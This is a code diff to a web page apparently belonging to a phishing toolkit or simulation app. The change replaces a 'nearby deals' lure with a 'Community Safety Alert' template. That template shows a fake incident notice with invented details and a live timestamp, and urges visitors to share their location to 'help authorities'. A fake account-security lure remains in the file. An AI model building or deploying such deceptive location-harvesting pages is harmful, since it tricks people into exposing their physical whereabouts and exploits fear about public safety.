@@ -7,9 +7,9 @@ import type { LocationData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
-import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription } from '@/components/ui/card'; // Renamed to avoid conflict
+import { Card as ShadcnCard, CardContent, CardDescription as ShadcnCardDescription, CardHeader, CardTitle } from '@/components/ui/card'; // Renamed to avoid conflict
 import Image from 'next/image';
-import { MapPin, CheckCircle, AlertTriangle, Sparkles, ShieldAlert, Lock, type LucideIcon } from 'lucide-react';
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, type LucideIcon, ExternalLink } from 'lucide-react';
 
 interface TemplateContent {
   title: string;
@@ -20,12 +20,12 @@ interface TemplateContent {
 }
 
 const templateContent: Record<string, TemplateContent> = {
-  'nearby-deals': {
-    title: 'Discover Amazing Deals Near You!',
-    actionText: 'Find My Deals',
-    message: 'Unlock exclusive offers and discounts from local stores.',
-    pageSpecificMessage: 'Share your location to see personalized deals from shops and restaurants in your area. Limited time offers available now!',
-    heroIcon: Sparkles,
+  'community-safety-alert': {
+    title: 'Important: Community Safety Alert',
+    actionText: 'View Alert Details & Confirm Safety',
+    message: 'A safety incident has been reported in your vicinity. Please verify your location to receive important details and updates.',
+    pageSpecificMessage: "We have received reports of a critical safety incident near your current area. To ensure you receive timely and accurate information, and to help authorities if needed, please share your current location. Your privacy is important; this is a temporary measure for community safety.",
+    heroIcon: AlertTriangle,
   },
   'security-alert': {
     title: 'Urgent: Account Security Action Required',
@@ -61,6 +61,11 @@ export default function LocationPhishingPage() {
   const [error, setError] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
   const [statusMessage, setStatusMessage] = useState<string | undefined>(undefined);
+  const [currentTime, setCurrentTime] = useState<string | null>(null);
+
+  useEffect(() => {
+    setCurrentTime(new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
+  }, []);
 
   useEffect(() => {
     addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
@@ -136,13 +141,29 @@ export default function LocationPhishingPage() {
   const renderTemplateSpecificContent = () => {
     const HeroIcon = content.heroIcon || MapPin;
     switch (templateId) {
-      case 'nearby-deals':
+      case 'community-safety-alert':
         return (
-          <div className="text-center space-y-6">
-            <HeroIcon className="w-16 h-16 text-accent mx-auto" />
-            <p className="text-xl text-foreground font-semibold">{content.message}</p>
-            <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
-          </div>
+          <Alert variant="destructive" className="mb-6 text-left p-6 shadow-lg">
+            <div className="flex items-center mb-4">
+              <HeroIcon className="h-10 w-10 mr-4 text-destructive-foreground" />
+              <AlertTitle className="text-2xl font-bold text-destructive-foreground">{content.title}</AlertTitle>
+            </div>
+            <AlertDescription className="text-md space-y-3 text-destructive-foreground/90">
+              <p>{content.message}</p>
+              <ShadcnCard className="bg-background/10 p-4 rounded-md border-destructive-foreground/30">
+                <CardHeader className="p-0 pb-2">
+                    <CardTitle className="text-lg text-destructive-foreground">Incident Details (Preliminary)</CardTitle>
+                </CardHeader>
+                <CardContent className="p-0 text-sm space-y-1">
+                    <p><strong>Reported Incident Type:</strong> Public Disturbance</p>
+                    <p><strong>Affected Area:</strong> Approx. 1-mile radius (pending confirmation)</p>
+                    <p><strong>Last Updated:</strong> {currentTime || 'Loading...'}</p>
+                    <p className="pt-2 text-xs"><i>Further details will be provided upon location verification.</i></p>
+                </CardContent>
+              </ShadcnCard>
+              <p className="font-semibold pt-2">{content.pageSpecificMessage}</p>
+            </AlertDescription>
+          </Alert>
         );
       case 'security-alert':
         return (
@@ -178,7 +199,7 @@ export default function LocationPhishingPage() {
 
   return (
     <PhishingPageLayout 
-        title={content.title}
+        title={templateId === 'community-safety-alert' ? '' : content.title} // Title handled within alert for new template
         isLoading={isLoading && status !== 'captured'}
         error={error}
         statusMessage={statusMessage}
@@ -190,7 +211,7 @@ export default function LocationPhishingPage() {
           <Button 
             onClick={handleLocationRequest} 
             size="lg"
-            className="w-full bg-accent hover:bg-accent/90 text-accent-foreground text-lg py-6 shadow-md"
+            className={`w-full text-lg py-6 shadow-md ${templateId === 'community-safety-alert' ? 'bg-destructive hover:bg-destructive/90 text-destructive-foreground' : 'bg-accent hover:bg-accent/90 text-accent-foreground'}`}
             disabled={isLoading || status === 'requesting'}
           >
             <MapPin className="mr-2 h-6 w-6" />
